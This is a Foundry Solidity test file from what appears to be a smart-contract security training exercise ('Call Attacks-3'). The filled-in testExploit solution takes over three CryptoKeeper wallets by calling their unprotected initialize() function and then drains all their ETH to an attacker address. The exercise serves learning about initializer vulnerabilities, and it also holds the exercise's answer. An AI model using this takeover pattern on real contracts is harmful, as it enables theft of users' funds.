// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../src/Utils/DummyERC20.sol";
import "../../src/18. Call Attacks-3/CryptoKeeper.sol";
//import "../../src/18. Call Attacks-3/CryptoKeeperSecured.sol";
import "../../src/18. Call Attacks-3/CryptoKeeperFactory.sol";

contract TestCA3 is Test {
    /**
     * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
     */
    CryptoKeeper template;
    CryptoKeeperFactory factory;
    DummyERC20 token;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address attacker = makeAddr("attacker");

    CryptoKeeper cryptoKeeper1;
    CryptoKeeper cryptoKeeper2;
    CryptoKeeper cryptoKeeper3;

    uint256 attackerInitialBalance;

    uint8 constant CALL_OPERATION = 1;

    function setUp() public {
        vm.startPrank(deployer);
        // Deploy ERC20 Token
        token = new DummyERC20("DummyERC20", "DToken", 1000 ether);

        // Deploy Template and Factory
        template = new CryptoKeeper();

        factory = new CryptoKeeperFactory(deployer, address(template));

        vm.stopPrank();

        address[] memory operators = new address[](1);

        // User1 creating CryptoKeepers
        vm.startPrank(user1);
        operators[0] = user1;
        bytes32 user1Salt = keccak256(abi.encodePacked(user1));
        cryptoKeeper1 = CryptoKeeper(payable(factory.createCryptoKeeper(user1Salt, operators)));

        vm.stopPrank();

        // User2 creating CryptoKeepers
        vm.startPrank(user2);
        operators[0] = user2;
        bytes32 user2Salt = keccak256(abi.encodePacked(user2));
        cryptoKeeper2 = CryptoKeeper(payable(factory.createCryptoKeeper(user2Salt, operators)));

        vm.stopPrank();

        // User3 creating CryptoKeepers
        vm.startPrank(user3);
        operators[0] = user3;
        bytes32 user3Salt = keccak256(abi.encodePacked(user3));
        cryptoKeeper3 = CryptoKeeper(payable(factory.createCryptoKeeper(user3Salt, operators)));

        vm.stopPrank();

        // Users load their cryptoKeeper with some ETH
        vm.deal(user1, 10 ether);
        vm.prank(user1);
        (bool success,) = address(cryptoKeeper1).call{value: 10 ether}("");

        vm.deal(user2, 10 ether);
        vm.prank(user2);
        (success,) = address(cryptoKeeper2).call{value: 10 ether}("");
        assertTrue(success);

        vm.deal(user3, 10 ether);
        vm.prank(user3);
        (success,) = address(cryptoKeeper3).call{value: 10 ether}("");
        assertTrue(success);

        // cryptoKeeper operation works
        vm.prank(user1);
        cryptoKeeper1.executeWithValue(user2, "0x", 1 ether);

        vm.prank(user2);
        cryptoKeeper2.executeWithValue(user3, "0x", 1 ether);

        vm.prank(user3);
        cryptoKeeper3.executeWithValue(user1, "0x", 1 ether);

        // Only operator can manage wallet
        // addOperator fails
        vm.prank(user2);
        vm.expectRevert("Not an operator");
        cryptoKeeper1.addOperator(user2);

        // executeWithValue fails
        vm.prank(user2);
        vm.expectRevert("Not an operator");
        cryptoKeeper1.executeWithValue(user2, "0x", 1 ether);

        // execute fails
        vm.prank(user2);
        vm.expectRevert("Not an operator");
        bytes memory tokenCallData = abi.encodeWithSignature("balanceOf(address)", deployer);
        cryptoKeeper1.execute(address(token), tokenCallData, CALL_OPERATION);

        attackerInitialBalance = attacker.balance;
    }

    function testExploit() public {
        /**
         * CODE YOUR SOLUTION HERE
         */
        vm.startPrank(attacker);
        address[] memory fOperators = new address[](1);
        fOperators[0] = attacker;
        cryptoKeeper1.initialize(fOperators);
        cryptoKeeper1.executeWithValue(attacker, "", address(cryptoKeeper1).balance);

        cryptoKeeper2.initialize(fOperators);
        cryptoKeeper2.executeWithValue(attacker, "", address(cryptoKeeper2).balance);

        cryptoKeeper3.initialize(fOperators);
        cryptoKeeper3.executeWithValue(attacker, "", address(cryptoKeeper3).balance);

        /**
         * SUCCESS CONDITIONS
         */

        // Attacker suppose to steal all the ETH from the Crypto Keepers
        assertEq(address(cryptoKeeper1).balance, 0);
        assertEq(address(cryptoKeeper2).balance, 0);
        assertEq(address(cryptoKeeper3).balance, 0);

        assertEq(attacker.balance, attackerInitialBalance + 30 ether - 3 ether); // initial balance + total eth - 3 eth sent to users in setup
    }
}
